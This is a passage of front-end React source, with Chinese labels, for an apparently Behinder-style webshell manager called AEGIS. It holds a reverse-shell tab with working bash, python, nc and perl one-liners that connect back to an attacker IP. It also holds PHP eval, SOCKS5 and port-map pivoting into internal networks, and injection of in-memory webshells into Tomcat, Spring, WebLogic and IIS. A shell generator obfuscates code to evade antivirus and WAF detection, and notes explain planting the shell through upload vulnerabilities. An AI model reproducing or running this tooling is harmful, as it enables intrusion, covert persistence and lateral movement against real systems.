                                  <td key={ci} className="px-2 py-0.5 font-mono text-[11px] text-slate-300 border-r border-line/20 max-w-xs truncate" title={cell}>
                                    {cell ?? <span className="text-slate-600">NULL</span>}
                                  </td>
                                ))}
                              </tr>
                            ))}
                          </tbody>
                        </table>
                      )}
                      {!dbError && !dbResult && (
                        <div className="text-center py-8 text-xs text-slate-600">配置连接后执行 SQL</div>
                      )}
                    </div>
                    {dbResult && (
                      <div className="px-3 py-1.5 border-t border-line text-[10px] text-slate-600">
                        {dbResult.rows.length} 行 · {dbResult.headers.length} 列
                      </div>
                    )}
                  </div>
                </div>
              )}

              {/* ── 反弹Shell ── */}
              {tab === 'rshell' && (
                <div className="p-4 overflow-y-auto h-full space-y-4">
                  <div className="rounded border border-line bg-base-700/30 p-4 space-y-3">
                    <div className="text-xs font-medium text-slate-300 mb-2">反弹Shell 配置</div>
                    <div className="grid grid-cols-3 gap-3">
                      <div>
                        <label className="block text-[10px] text-slate-500 mb-1">类型</label>
                        <select value={cbType} onChange={e => setCbType(e.target.value)}
                          className="w-full rounded border border-line bg-base-700/60 px-2 py-1.5 text-xs text-slate-200 outline-none focus:border-cyber">
                          <option value="shell">Shell（TCP）</option>
                          <option value="meter">Meterpreter</option>
                        </select>
                      </div>
                      <div>
                        <label className="block text-[10px] text-slate-500 mb-1">监听 IP</label>
                        <input value={cbIP} onChange={e => setCbIP(e.target.value)}
                          placeholder="你的IP"
                          className="w-full rounded border border-line bg-base-700/60 px-2 py-1.5 font-mono text-xs text-slate-200 outline-none focus:border-cyber" />
                      </div>
                      <div>
                        <label className="block text-[10px] text-slate-500 mb-1">端口</label>
                        <input value={cbPort} onChange={e => setCbPort(e.target.value)}
                          className="w-full rounded border border-line bg-base-700/60 px-2 py-1.5 font-mono text-xs text-slate-200 outline-none focus:border-cyber" />
                      </div>
                    </div>
                    <div className="flex items-center gap-3">
                      <button onClick={sendConnectBack}
                        disabled={cbRunning || selected.status !== 'online' || !cbIP || !cbPort}
                        className="flex items-center gap-1.5 rounded border border-red-400/40 bg-red-400/10 px-4 py-1.5 text-xs text-red-400 hover:bg-red-400/20 disabled:opacity-40">
                        {cbRunning ? <RefreshCw size={12} className="animate-spin" /> : <Send size={12} />}
                        发起反弹
                      </button>
                      {cbMsg && <span className={`text-xs ${cbMsg.startsWith('✓') ? 'text-emerald-400' : 'text-red-400'}`}>{cbMsg}</span>}
                    </div>
                  </div>

                  {/* 监听命令提示 */}
                  <div className="rounded border border-line bg-base-700/30 p-3">
                    <div className="text-[10px] text-slate-500 mb-2">本机监听命令</div>
                    <div className="flex items-center gap-2">
                      <code className="flex-1 font-mono text-xs text-amber-300 bg-black/40 rounded px-2 py-1.5">{ncListen()}</code>
                      <button onClick={() => navigator.clipboard.writeText(ncListen())}
                        className="p-1 rounded hover:bg-base-600/50 text-slate-500 hover:text-slate-300">
                        <Copy size={12} />
                      </button>
                    </div>
                  </div>

                  {/* 其他反弹Shell生成器 */}
                  <div className="rounded border border-line bg-base-700/30 p-3 space-y-2">
                    <div className="text-[10px] text-slate-500 mb-2">常用反弹Shell Payload（参考）</div>
                    {cbIP && cbPort && [
                      { label: 'bash', cmd: `bash -i >& /dev/tcp/${cbIP}/${cbPort} 0>&1` },
                      { label: 'python3', cmd: `python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('${cbIP}',${cbPort}));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(['/bin/bash'])"` },
                      { label: 'python2', cmd: `python -c "import socket,subprocess,os;s=socket.socket();s.connect(('${cbIP}',${cbPort}));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(['/bin/sh'])"` },
                      { label: 'nc',     cmd: `nc ${cbIP} ${cbPort} -e /bin/bash` },
                      { label: 'perl',   cmd: `perl -e 'use Socket;$i="${cbIP}";$p=${cbPort};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'` },
                    ].map(({ label, cmd }) => (
                      <div key={label} className="flex items-start gap-2">
                        <span className="text-[10px] text-slate-500 font-mono w-14 flex-shrink-0 mt-1">{label}</span>
                        <code className="flex-1 font-mono text-[10px] text-slate-400 bg-black/30 rounded px-2 py-1 break-all">{cmd}</code>
                        <button onClick={() => navigator.clipboard.writeText(cmd)}
                          className="p-1 rounded hover:bg-base-600/50 text-slate-600 hover:text-slate-300 flex-shrink-0">
                          <Copy size={11} />
                        </button>
                      </div>
                    ))}
                    {(!cbIP || !cbPort) && (
                      <p className="text-[10px] text-slate-600">填写 IP 和端口后显示 Payload</p>
                    )}
                  </div>
                </div>
              )}

              {/* ── 代码执行 ── */}
              {tab === 'eval' && (
                <div className="flex flex-col h-full">
                  <div className="flex items-center justify-between px-3 py-2 border-b border-line flex-shrink-0">
                    <span className="text-[11px] text-slate-400">PHP 代码执行（eval）</span>
                    <div className="flex gap-2">
                      {['echo phpinfo();', 'var_dump($_SERVER);', 'echo PHP_VERSION;'].map(t => (
                        <button key={t} onClick={() => setEvalCode(t)}
                          className="text-[10px] text-slate-500 hover:text-slate-300 font-mono truncate max-w-[120px]">{t}</button>
                      ))}
                    </div>
                  </div>
                  <div className="flex h-full overflow-hidden">
                    <div className="flex flex-col w-1/2 border-r border-line">
                      <div className="flex items-center justify-between px-3 py-1.5 border-b border-line/30 flex-shrink-0">
                        <span className="text-[10px] text-slate-500">PHP 代码</span>
                        <button onClick={runEval}
                          disabled={evalRunning || selected.status !== 'online'}
                          className="flex items-center gap-1 rounded border border-cyber/40 bg-cyber/10 px-2 py-0.5 text-[10px] text-cyber hover:bg-cyber/20 disabled:opacity-40">
                          {evalRunning ? <RefreshCw size={10} className="animate-spin" /> : <Play size={10} />}
                          执行
                        </button>
                      </div>
                      <textarea value={evalCode} onChange={e => setEvalCode(e.target.value)}
                        className="flex-1 resize-none bg-black/50 p-3 font-mono text-xs text-slate-200 outline-none"
                        placeholder="echo phpinfo();" />
                    </div>
                    <div className="flex flex-col w-1/2">
                      <div className="flex items-center justify-between px-3 py-1.5 border-b border-line/30 flex-shrink-0">
                        <span className="text-[10px] text-slate-500">输出</span>
                        <button onClick={() => setEvalOutput('')}
                          className="text-[10px] text-slate-600 hover:text-slate-400">清空</button>
                      </div>
                      <pre className="flex-1 overflow-auto p-3 font-mono text-xs text-slate-300 bg-black/40 whitespace-pre-wrap break-all">
                        {evalRunning ? <span className="text-slate-500 animate-pulse">执行中…</span> : evalOutput || <span className="text-slate-600">// 执行后在此显示结果</span>}
                      </pre>
                    </div>
                  </div>
                </div>
              )}

              {/* ── SOCKS5 代理 ── */}
              {tab === 'socks' && (
                <div className="p-4 overflow-y-auto h-full space-y-4">
                  <div className="rounded border border-line bg-base-700/30 p-4 space-y-3">
                    <div className="text-xs font-medium text-slate-300">SOCKS5 代理配置</div>
                    <div className="flex items-end gap-3">
                      <div className="w-32">
                        <label className="block text-[10px] text-slate-500 mb-1">本地监听端口</label>
                        <input value={socksPort} onChange={e => setSocksPort(e.target.value)}
                          disabled={socksRunning}
                          className="w-full rounded border border-line bg-base-700/60 px-2 py-1.5 font-mono text-xs text-slate-200 outline-none focus:border-cyber disabled:opacity-50" />
                      </div>
                      {!socksRunning ? (
                        <button onClick={socksStart}
                          disabled={selected.status !== 'online'}
                          className="flex items-center gap-1.5 rounded border border-emerald-400/40 bg-emerald-400/10 px-4 py-1.5 text-xs text-emerald-400 hover:bg-emerald-400/20 disabled:opacity-40">
                          <Play size={11} /> 启动
                        </button>
                      ) : (
                        <button onClick={socksStop}
                          className="flex items-center gap-1.5 rounded border border-red-400/40 bg-red-400/10 px-4 py-1.5 text-xs text-red-400 hover:bg-red-400/20">
                          <Square size={11} /> 停止
                        </button>
                      )}
                      <button onClick={pollSocksStatus}
                        className="p-1.5 rounded hover:bg-base-600/50 text-slate-500 hover:text-slate-300">
                        <RefreshCw size={12} />
                      </button>
                      <div className="ml-auto text-right">
                        <div className={`text-xs font-mono ${socksRunning ? 'text-emerald-400' : 'text-slate-600'}`}>
                          {socksRunning ? '● 运行中' : '○ 已停止'}
                        </div>
                        {socksRunning && <div className="text-[10px] text-slate-500">{socksConns} 条活跃连接</div>}
                      </div>
                    </div>
                  </div>
                  {socksRunning && (
                    <div className="rounded border border-cyber/20 bg-cyber/5 p-3 space-y-2">
                      <div className="text-[10px] text-slate-500">使用方法</div>
                      <div className="flex items-center gap-2">
                        <code className="flex-1 font-mono text-xs text-amber-300 bg-black/40 rounded px-2 py-1.5">
                          {`export https_proxy=socks5://127.0.0.1:${socksPort}`}
                        </code>
                        <button onClick={() => navigator.clipboard.writeText(`export https_proxy=socks5://127.0.0.1:${socksPort}`)}
                          className="p-1 rounded hover:bg-base-600/50 text-slate-500">
                          <Copy size={11} />
                        </button>
                      </div>
                      <div className="text-[10px] text-slate-500">
                        Proxychains: 在 /etc/proxychains.conf 末尾添加 <code className="font-mono">socks5 127.0.0.1 {socksPort}</code>
                      </div>
                    </div>
                  )}
                  <div className="rounded border border-amber-400/20 bg-amber-400/5 p-3 text-[11px] text-amber-300/60 space-y-1">
                    <p>原理：本地 SOCKS5 服务器将 TCP 流量通过 PHP Shell Session 中继到目标网络。</p>
                    <p>适用于内网渗透穿透，使用 Proxychains 或浏览器插件配置代理。</p>
                  </div>
                </div>
              )}

              {/* ── 端口映射 ── */}
              {tab === 'portmap' && (
                <div className="p-4 overflow-y-auto h-full space-y-4">
                  <div className="rounded border border-line bg-base-700/30 p-4 space-y-3">
                    <div className="text-xs font-medium text-slate-300">端口映射配置</div>
                    <div className="grid grid-cols-3 gap-3">
                      <div>
                        <label className="block text-[10px] text-slate-500 mb-1">本地端口</label>
                        <input value={pmLocalPort} onChange={e => setPmLocalPort(e.target.value)}
                          disabled={pmRunning}
                          className="w-full rounded border border-line bg-base-700/60 px-2 py-1.5 font-mono text-xs text-slate-200 outline-none focus:border-cyber disabled:opacity-50" />
                      </div>
                      <div>
                        <label className="block text-[10px] text-slate-500 mb-1">目标主机</label>
                        <input value={pmTargetHost} onChange={e => setPmTargetHost(e.target.value)}
                          disabled={pmRunning}
                          placeholder="127.0.0.1"
                          className="w-full rounded border border-line bg-base-700/60 px-2 py-1.5 font-mono text-xs text-slate-200 outline-none focus:border-cyber disabled:opacity-50" />
                      </div>
                      <div>
                        <label className="block text-[10px] text-slate-500 mb-1">目标端口</label>
                        <input value={pmTargetPort} onChange={e => setPmTargetPort(e.target.value)}
                          disabled={pmRunning}
                          className="w-full rounded border border-line bg-base-700/60 px-2 py-1.5 font-mono text-xs text-slate-200 outline-none focus:border-cyber disabled:opacity-50" />
                      </div>
                    </div>
                    <div className="flex items-center gap-3">
                      {!pmRunning ? (
                        <button onClick={portMapStart}
                          disabled={selected.status !== 'online'}
                          className="flex items-center gap-1.5 rounded border border-emerald-400/40 bg-emerald-400/10 px-4 py-1.5 text-xs text-emerald-400 hover:bg-emerald-400/20 disabled:opacity-40">
                          <Play size={11} /> 启动映射
                        </button>
                      ) : (
                        <button onClick={portMapStop}
                          className="flex items-center gap-1.5 rounded border border-red-400/40 bg-red-400/10 px-4 py-1.5 text-xs text-red-400 hover:bg-red-400/20">
                          <Square size={11} /> 停止映射
                        </button>
                      )}
                      <button onClick={pollPortMapStatus}
                        className="p-1.5 rounded hover:bg-base-600/50 text-slate-500">
                        <RefreshCw size={12} />
                      </button>
                      <div className={`text-xs font-mono ml-auto ${pmRunning ? 'text-emerald-400' : 'text-slate-600'}`}>
                        {pmRunning ? `● 0.0.0.0:${pmLocalPort} → ${pmTargetHost}:${pmTargetPort}` : '○ 未运行'}
                      </div>
                    </div>
                  </div>
                  {pmRunning && (
                    <div className="rounded border border-cyber/20 bg-cyber/5 p-3">
                      <div className="text-[10px] text-slate-500 mb-1.5">验证连接（本机执行）</div>
                      <code className="font-mono text-xs text-amber-300">curl http://127.0.0.1:{pmLocalPort}/</code>
                    </div>
                  )}
                  <div className="rounded border border-amber-400/20 bg-amber-400/5 p-3 text-[11px] text-amber-300/60 space-y-1">
                    <p>本地端口映射：将攻击机本地端口的流量通过 PHP Shell 转发到目标内网服务。</p>
                    <p>例：将本地 8080 映射到目标内网 192.168.1.100:80，可直接访问内网 Web 服务。</p>
                  </div>
                </div>
              )}

              {/* ── 内存马 ── */}
              {tab === 'memshell' && (
                <div className="p-4 overflow-y-auto h-full space-y-4">
                  {/* 语言标签 */}
                  {(() => {
                    const isJava = selected.shellType === 'jsp' || selected.shellType === 'aspx'
                    const isAspx = selected.shellType === 'aspx'
                    const phpTypes = [
                      { value: 'shutdown', label: 'register_shutdown_function', desc: '页面关闭时触发，最隐蔽' },
                      { value: 'filter',   label: 'ob_start 输出过滤器',       desc: '输出缓冲阶段拦截每次请求' },
                      { value: 'session',  label: 'Session 持久化',             desc: 'Session 存储，需 session_start' },
                    ]
                    const jspTypes = [
                      { value: 'filter',   label: 'Tomcat Filter',     desc: '注入 FilterChain，拦截所有请求，通用性最强' },
                      { value: 'listener', label: 'Tomcat Listener',   desc: '注入 RequestListener，监听每次请求' },
                      { value: 'spring',   label: 'Spring Controller', desc: '注册 Spring MVC Controller，仅限 Spring 应用' },
                      { value: 'weblogic', label: 'WebLogic Filter',   desc: '反射注入 WebLogic FilterManager，适用于 WebLogic 10.3+/12c' },
                    ]
                    const aspxTypes = [
                      { value: 'handler', label: 'IHttpHandler (RouteTable)', desc: '通过 RouteTable 注册持久路由，推荐。注入后访问返回的路径即可连接' },
                      { value: 'module',  label: 'IHttpModule (全局拦截)',     desc: '通过 RegisterModule 注入全局模块(.NET4.5+)，无固定URL，需在自定义请求头加 X-AEGIS-KEY:{tag}' },
                    ]
                    const types = isAspx ? aspxTypes : (isJava ? jspTypes : phpTypes)
                    const defaultPath = isAspx ? 'C:\\inetpub\\wwwroot\\.x.aspx' : (isJava ? '/opt/tomcat/webapps/ROOT/.x.jsp' : '/tmp/.cache.php')
                    return (
                      <div className="rounded border border-line bg-base-700/30 p-4 space-y-3">
                        <div className="flex items-center gap-2">
                          <div className="text-xs font-medium text-slate-300">内存马生成与注入</div>
                          <span className={`chip border text-[10px] ${isAspx ? 'text-blue-400 bg-blue-400/10 border-blue-400/30' : isJava ? 'text-orange-400 bg-orange-400/10 border-orange-400/30' : 'text-emerald-400 bg-emerald-400/10 border-emerald-400/30'}`}>
                            {isAspx ? 'C#/.NET' : isJava ? 'Java' : 'PHP'}
                          </span>
                        </div>
                        <div className="grid grid-cols-2 gap-3">
                          <div>
                            <label className="block text-[10px] text-slate-500 mb-1">内存马类型</label>
                            <select value={memShellType} onChange={e => setMemShellType(e.target.value)}
                              className="w-full rounded border border-line bg-base-700/60 px-2 py-1.5 text-xs text-slate-200 outline-none focus:border-cyber">
                              {types.map(t => (
                                <option key={t.value} value={t.value}>{t.label}</option>
                              ))}
                            </select>
                            <p className="mt-1 text-[10px] text-slate-600">
                              {types.find(t => t.value === memShellType)?.desc}
                            </p>
                          </div>
                          <div>
                            <label className="block text-[10px] text-slate-500 mb-1">
                              {isAspx ? '注入器路径（写入后 GET 访问一次触发注册，文件随即自删）' : isJava ? '注入器路径（写入后访问一次触发注入）' : '注入路径（写文件时用）'}
                            </label>
                            <input value={memShellPath || defaultPath}
                              onChange={e => setMemShellPath(e.target.value)}
                              placeholder={defaultPath}
                              className="w-full rounded border border-line bg-base-700/60 px-2 py-1.5 font-mono text-xs text-slate-200 outline-none focus:border-cyber" />
                          </div>
                        </div>
                        <div className="flex items-center gap-2 flex-wrap">
                          <button onClick={genMemShell}
                            disabled={selected.status !== 'online'}
                            className="flex items-center gap-1.5 rounded border border-cyber/40 bg-cyber/10 px-3 py-1.5 text-xs text-cyber hover:bg-cyber/20 disabled:opacity-40">
                            <Code2 size={11} /> 生成代码
                          </button>
                          <button onClick={injectMemShell}
                            disabled={selected.status !== 'online' || !memShellPath}
                            className="flex items-center gap-1.5 rounded border border-amber-400/40 bg-amber-400/10 px-3 py-1.5 text-xs text-amber-400 hover:bg-amber-400/20 disabled:opacity-40">
                            <Cpu size={11} /> 写入文件
                          </button>
                          {memShellCode && (
                            <button onClick={() => navigator.clipboard.writeText(memShellCode)}
                              className="flex items-center gap-1.5 rounded border border-line px-3 py-1.5 text-xs text-slate-400 hover:text-slate-200">
                              <Copy size={11} /> 复制
                            </button>
                          )}
                          {memShellMsg && (
                            <span className={`text-xs ${memShellMsg.startsWith('✓') ? 'text-emerald-400' : 'text-red-400'}`}>
                              {memShellMsg}
                            </span>
                          )}
                        </div>
                      </div>
                    )
                  })()}
                  {memShellCode && (
                    <div className="rounded border border-line bg-black/60">
                      <div className="flex items-center justify-between px-3 py-1.5 border-b border-line">
                        <span className="text-[11px] text-slate-500">生成的内存马代码</span>
                        <span className="text-[10px] text-slate-600">使用相同密码连接</span>
                      </div>
                      <pre className="p-3 font-mono text-xs text-slate-300 overflow-x-auto whitespace-pre-wrap break-all max-h-72">
                        {memShellCode}
                      </pre>
                    </div>
                  )}
                  <div className="rounded border border-amber-400/20 bg-amber-400/5 p-3 text-[11px] text-amber-300/60 space-y-1">
                    {(selected.shellType === 'jsp' || selected.shellType === 'aspx') ? (
                      <>
                        <p><strong className="text-amber-300/80">Java 内存马注入流程：</strong></p>
                        <p>1. 生成注入器 JSP 代码 → 2. 通过文件管理写入目标路径 → 3. 浏览器访问该路径一次触发注入 → 4. 注入成功后文件自动删除</p>
                        <p>Filter 类型拦截 /* 所有路径，Listener 同理；Spring Controller 映射到随机 URL（响应中返回）。</p>
                        <p>注入后用 AEGIS 以 jsp 类型、相同密码、<strong>任意有效 URL</strong> 即可连接 Filter/Listener 内存马。</p>
                      </>
                    ) : (
                      <>
                        <p>内存马通过 PHP 钩子函数实现持久化，不依赖文件即可在内存中执行 Webshell 功能。</p>
                        <p>使用相同密码通过「添加」功能即可连接生成的内存马。</p>
                      </>
                    )}
                  </div>
                </div>
              )}

              {/* ── 插件 ── */}
              {tab === 'plugin' && (
                <div className="flex flex-col h-full">
                  <div className="flex items-center justify-between px-3 py-2 border-b border-line flex-shrink-0">
                    <div className="flex items-center gap-2">
                      <span className="text-[11px] text-slate-400">插件执行</span>
                      <button onClick={() => setPluginAsync(v => !v)}
                        className={`text-[10px] px-2 py-0.5 rounded border transition ${pluginAsync ? 'border-amber-400/40 bg-amber-400/10 text-amber-400' : 'border-line text-slate-500 hover:text-slate-300'}`}>
                        {pluginAsync ? '异步模式' : '同步模式'}
                      </button>
                      {pluginPolling && <span className="text-[10px] text-amber-400 animate-pulse">轮询中…</span>}
                    </div>
                    <div className="flex gap-2">
                      {['phpinfo();', 'echo get_current_user();', 'echo implode(",",get_loaded_extensions());'].map(t => (
                        <button key={t} onClick={() => setPluginCode(t)}
                          className="text-[10px] text-slate-500 hover:text-slate-300 font-mono truncate max-w-[120px]">{t}</button>
                      ))}
                    </div>
                  </div>
                  <div className="flex flex-1 overflow-hidden">
                    <div className="flex flex-col w-1/2 border-r border-line">
                      <div className="flex items-center justify-between px-3 py-1.5 border-b border-line/30 flex-shrink-0">
                        <span className="text-[10px] text-slate-500">插件代码（PHP）</span>
                        <div className="flex gap-1.5">
                          {pluginAsync ? (
                            <>
                              <button onClick={submitPlugin}
                                disabled={pluginRunning || selected.status !== 'online' || !pluginCode.trim()}
                                className="flex items-center gap-1 rounded border border-amber-400/40 bg-amber-400/10 px-2 py-0.5 text-[10px] text-amber-400 hover:bg-amber-400/20 disabled:opacity-40">
                                {pluginPolling ? <RefreshCw size={10} className="animate-spin" /> : <Play size={10} />}
                                异步提交
                              </button>
                              {pluginPolling && (
                                <button onClick={stopPlugin}
                                  className="flex items-center gap-1 rounded border border-red-400/40 bg-red-400/10 px-2 py-0.5 text-[10px] text-red-400">
                                  <Square size={10} /> 停止
                                </button>
                              )}
                            </>
                          ) : (
                            <button onClick={runPlugin}
                              disabled={pluginRunning || selected.status !== 'online' || !pluginCode.trim()}
                              className="flex items-center gap-1 rounded border border-cyber/40 bg-cyber/10 px-2 py-0.5 text-[10px] text-cyber hover:bg-cyber/20 disabled:opacity-40">
                              {pluginRunning ? <RefreshCw size={10} className="animate-spin" /> : <Play size={10} />}
                              执行
                            </button>
                          )}
                        </div>
                      </div>
                      <textarea value={pluginCode} onChange={e => setPluginCode(e.target.value)}
                        className="flex-1 resize-none bg-black/50 p-3 font-mono text-xs text-slate-200 outline-none"
                        placeholder={`// 输入 PHP 插件代码（不含 <?php ?>）\necho 'Hello from plugin!';\n`} />
                    </div>
                    <div className="flex flex-col w-1/2">
                      <div className="flex items-center justify-between px-3 py-1.5 border-b border-line/30 flex-shrink-0">
                        <span className="text-[10px] text-slate-500">输出{pluginTaskId && <span className="text-slate-600 ml-1">· {pluginTaskId.slice(0,16)}…</span>}</span>
                        <button onClick={() => setPluginOutput('')}
                          className="text-[10px] text-slate-600 hover:text-slate-400">清空</button>
                      </div>
                      <pre className="flex-1 overflow-auto p-3 font-mono text-xs text-slate-300 bg-black/40 whitespace-pre-wrap break-all">
                        {(pluginRunning && !pluginAsync)
                          ? <span className="text-slate-500 animate-pulse">执行中…</span>
                          : pluginPolling
                          ? <span className="text-amber-400 animate-pulse">异步运行中，等待结果…</span>
                          : pluginOutput || <span className="text-slate-600">// 执行后在此显示结果</span>}
                      </pre>
                    </div>
                  </div>
                </div>
              )}

              {/* ── 获取Shell ── */}
              {tab === 'code' && (
                <div className="p-4 overflow-y-auto h-full">
                  <div className="flex items-center gap-2 mb-3 flex-wrap">
                    <div className="flex gap-1">
                      {['php', 'jsp', 'aspx', 'asp'].map(t => (
                        <button key={t} onClick={() => { setCodeType(t); if (selected) loadShellCode(selected.id, t) }}
                          className={`px-3 py-1 rounded text-xs border transition ${codeType === t ? 'border-cyber/40 bg-cyber/10 text-cyber' : 'border-line text-slate-400 hover:text-slate-200'}`}>
                          {t.toUpperCase()}
                        </button>
                      ))}
                    </div>
                    {codeType === 'php' && (
                      <button
                        onClick={() => { const next = !codeObfuscate; setCodeObfuscate(next); if (selected) loadShellCode(selected.id, codeType, next) }}
                        title="随机变量名+字符串分割，每次生成不同代码特征，对抗 AV/WAF 签名检测"
                        className={`flex items-center gap-1 rounded border px-2.5 py-1 text-xs transition ${codeObfuscate ? 'border-purple-400/50 bg-purple-400/10 text-purple-300' : 'border-line text-slate-500 hover:text-slate-300'}`}>
                        <Zap size={11} /> {codeObfuscate ? '混淆 ON' : '混淆'}
                      </button>
                    )}
                    <button onClick={copyCode}
                      className="ml-auto flex items-center gap-1.5 rounded border border-line px-3 py-1 text-xs text-slate-400 hover:text-slate-200">
                      {copied ? <><Check size={12} className="text-emerald-400" /> 已复制</> : <><Copy size={12} /> 复制</>}
                    </button>
                    {selected && (
                      <button onClick={() => loadShellCode(selected.id, codeType)}
                        className="flex items-center gap-1 rounded border border-line px-2 py-1 text-xs text-slate-500 hover:text-slate-300">
                        <RefreshCw size={11} /> 刷新
                      </button>
                    )}
                  </div>

                  <div className="rounded border border-line bg-black/60 mb-3">
                    <div className="flex items-center justify-between px-3 py-1.5 border-b border-line">
                      <span className="text-[11px] text-slate-500">
                        {codeType === 'php' ? 'shell.php' : codeType === 'jsp' ? 'shell.jsp' : codeType === 'asp' ? 'shell.asp' : 'shell.aspx'}
                      </span>
                      <span className="text-[10px] text-slate-600">
                        冰蝎 v4.1 · {codeType === 'php' ? 'AES-128-ECB (default_aes)' : codeType === 'asp' ? 'XOR' : 'AES-128-ECB/CBC'}
                        {JSP_ASPX_PARTIAL.has(codeType) && ' · 字节码层开发中'}
                      </span>
                    </div>
                    <pre className="p-4 font-mono text-xs text-slate-300 overflow-x-auto whitespace-pre-wrap break-all leading-relaxed max-h-64">
                      {shellCode || '加载中…'}
                    </pre>
                  </div>

                  <div className="rounded border border-amber-400/20 bg-amber-400/5 p-3 text-xs space-y-1">
                    <p className="font-medium text-amber-300/80 mb-1">部署说明</p>
                    <ul className="space-y-0.5 text-amber-300/60 text-[11px]">
                      <li>1. 将上方 Shell 代码通过文件上传漏洞、WebDAV 等方式部署到目标</li>
                      <li>2. 浏览器访问 Shell URL 返回空白页为正常</li>
                      <li>3. 在左侧「添加」时填写对应 URL 和密码（默认 aegis）</li>
                      <li>4. 点击「连接/刷新」验证连通性并获取系统信息</li>
                      {JSP_ASPX_PARTIAL.has(codeType) && (
                        <li className="text-amber-400/80">⚠ {codeType.toUpperCase()} 传输协议已实现，文件管理/命令执行需预编译 Java/.NET 字节码（开发中）</li>
                      )}
                    </ul>
                  </div>
                </div>
              )}

              {/* ── 内网穿透 Transfer ── */}
              {tab === 'transfer' && (
                <div className="flex flex-col h-full">
                  <div className="flex items-center gap-2 px-3 py-2 border-b border-line flex-shrink-0">
                    <span className="text-[10px] text-slate-500">模式：</span>
                    {(['http', 'tcp'] as const).map(m => (
                      <button key={m} onClick={() => setTransferMode(m)}
                        className={`px-3 py-1 rounded text-xs border transition ${transferMode === m ? 'border-cyber/40 bg-cyber/10 text-cyber' : 'border-line text-slate-400 hover:text-slate-200'}`}>
                        {m.toUpperCase()}
                      </button>
                    ))}
                    <button onClick={transferMode === 'http' ? runTransferHTTP : runTransferTCP}
                      disabled={transferRunning || selected.status !== 'online'}
                      className="ml-auto flex items-center gap-1.5 rounded border border-cyber/40 bg-cyber/10 px-3 py-1.5 text-xs text-cyber hover:bg-cyber/20 disabled:opacity-40">
                      {transferRunning ? <RefreshCw size={11} className="animate-spin" /> : <Play size={11} />}
                      发送请求
                    </button>
                  </div>
                  <div className="flex flex-1 overflow-hidden">
                    {/* 左侧配置 */}
                    <div className="w-64 flex-shrink-0 border-r border-line p-3 space-y-2 overflow-y-auto">
                      {transferMode === 'http' ? (
                        <>
                          <div>
                            <label className="block text-[10px] text-slate-500 mb-1">方法</label>
                            <select value={transferMethod} onChange={e => setTransferMethod(e.target.value)}
                              className="w-full rounded border border-line bg-base-700/60 px-2 py-1 text-xs text-slate-200 outline-none focus:border-cyber">
                              {['GET','POST','PUT','DELETE','HEAD','OPTIONS'].map(m => <option key={m}>{m}</option>)}
                            </select>
                          </div>
                          <div>
                            <label className="block text-[10px] text-slate-500 mb-1">URL</label>
                            <input value={transferURL} onChange={e => setTransferURL(e.target.value)}
                              placeholder="http://192.168.1.1/"
                              className="w-full rounded border border-line bg-base-700/60 px-2 py-1 font-mono text-xs text-slate-200 outline-none focus:border-cyber" />
                          </div>
                          <div>
                            <label className="block text-[10px] text-slate-500 mb-1">请求头（每行 Key: Value）</label>
                            <textarea value={transferHeaders} onChange={e => setTransferHeaders(e.target.value)}
                              rows={3} placeholder="Content-Type: application/json"
                              className="w-full resize-none rounded border border-line bg-base-700/60 px-2 py-1 font-mono text-xs text-slate-200 outline-none focus:border-cyber" />
                          </div>
                          <div>
                            <label className="block text-[10px] text-slate-500 mb-1">请求体</label>
                            <textarea value={transferBody} onChange={e => setTransferBody(e.target.value)}
                              rows={4} placeholder='{"key":"value"}'
                              className="w-full resize-none rounded border border-line bg-base-700/60 px-2 py-1 font-mono text-xs text-slate-200 outline-none focus:border-cyber" />
                          </div>
                        </>
                      ) : (
                        <>
                          <div>
                            <label className="block text-[10px] text-slate-500 mb-1">目标主机</label>
                            <input value={transferHost} onChange={e => setTransferHost(e.target.value)}
                              placeholder="192.168.1.1"
                              className="w-full rounded border border-line bg-base-700/60 px-2 py-1 font-mono text-xs text-slate-200 outline-none focus:border-cyber" />
                          </div>
                          <div>
                            <label className="block text-[10px] text-slate-500 mb-1">端口</label>
                            <input value={transferPort} onChange={e => setTransferPort(e.target.value)}
                              className="w-full rounded border border-line bg-base-700/60 px-2 py-1 font-mono text-xs text-slate-200 outline-none focus:border-cyber" />
                          </div>
                          <div>
                            <label className="block text-[10px] text-slate-500 mb-1">发送数据</label>
                            <textarea value={transferPayload} onChange={e => setTransferPayload(e.target.value)}
                              rows={6} placeholder="GET / HTTP/1.0&#10;Host: target&#10;"
                              className="w-full resize-none rounded border border-line bg-base-700/60 px-2 py-1 font-mono text-xs text-slate-200 outline-none focus:border-cyber" />
                          </div>
                        </>
                      )}
                    </div>
                    {/* 右侧响应 */}
                    <div className="flex flex-col flex-1 overflow-hidden">
                      <div className="flex items-center justify-between px-3 py-1.5 border-b border-line/30 flex-shrink-0">
                        <span className="text-[10px] text-slate-500">响应内容</span>
                        <button onClick={() => setTransferResponse('')} className="text-[10px] text-slate-600 hover:text-slate-400">清空</button>
                      </div>
                      <pre className="flex-1 overflow-auto p-3 font-mono text-xs text-slate-300 bg-black/40 whitespace-pre-wrap break-all">
                        {transferRunning
                          ? <span className="text-slate-500 animate-pulse">请求中…</span>
                          : transferResponse || <span className="text-slate-600">// 发送请求后在此显示响应</span>}
                      </pre>
                    </div>
                  </div>
                </div>
              )}

              {/* ── BShell 绑定Shell管理 ── */}
              {tab === 'bshell' && (
                <div className="flex h-full">
                  {/* 左侧控制 */}
                  <div className="w-56 flex-shrink-0 border-r border-line p-3 space-y-3 overflow-y-auto">
                    <div className="text-[10px] text-slate-500 font-medium uppercase tracking-wide">BShell 监听</div>
                    <div>
                      <label className="block text-[10px] text-slate-500 mb-1">监听端口（目标上）</label>
                      <input value={bshellPort} onChange={e => setBshellPort(e.target.value)}
                        className="w-full rounded border border-line bg-base-700/60 px-2 py-1 font-mono text-xs text-slate-200 outline-none focus:border-cyber" />
                    </div>
                    <div className="flex gap-1.5">
                      <button onClick={startBshellListen}
                        disabled={selected.status !== 'online'}
                        className="flex-1 flex items-center justify-center gap-1 rounded border border-emerald-400/40 bg-emerald-400/10 py-1.5 text-xs text-emerald-400 hover:bg-emerald-400/20 disabled:opacity-40">
                        <Play size={10} /> 监听
                      </button>
                      <button onClick={stopBshellListen}
